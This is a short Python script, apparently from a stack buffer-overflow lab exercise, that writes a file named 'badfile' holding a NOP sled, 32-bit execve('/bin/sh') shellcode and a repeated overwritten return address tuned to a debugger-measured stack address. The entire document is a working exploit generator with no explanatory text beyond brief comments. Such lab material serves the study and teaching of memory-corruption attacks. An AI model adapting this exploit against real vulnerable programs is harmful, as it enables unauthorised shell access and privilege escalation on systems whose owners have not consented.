#!/usr/bin/python3
import sys

shellcode = (
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
	"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
	"\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOPs
content = bytearray(0x90 for i in range(500))

# Put the shellcode at the end of content
start = 500 - len(shellcode)
content[start:start+len(shellcode)] = shellcode

##################################################################
# Decide the return address value and put it in payload

# The first number is the value of epb
# The second one is to compensate for debugger's space
ret = 0xffffcaf8 + 0x100

L = 4  # 4 for 32 bit, 8 for 64 bit

# This loop supports buffer size up to 200
# In fixed buffer size example for 100 ==> ret address was at 112
# For buffer size 200 ==> ret address is at 212
 
for i in range(0, 216, 4):
	content[i: i+L] = (ret).to_bytes(L, byteorder="little")
	

#################################################################
	
# Write the content to the file
with open("badfile", "wb") as file:
	file.write(content)

print("Content written to badfile")




